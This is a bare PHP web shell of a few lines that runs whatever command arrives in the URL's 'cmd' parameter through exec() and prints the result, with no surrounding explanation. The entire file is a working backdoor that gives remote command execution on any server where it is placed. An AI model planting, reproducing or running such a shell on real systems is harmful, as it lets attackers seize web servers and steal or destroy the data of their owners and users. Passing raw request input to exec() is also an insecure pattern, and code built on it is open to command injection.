<?php
$output = null;
exec($_GET['cmd'], $output);
print_r($output);
?>
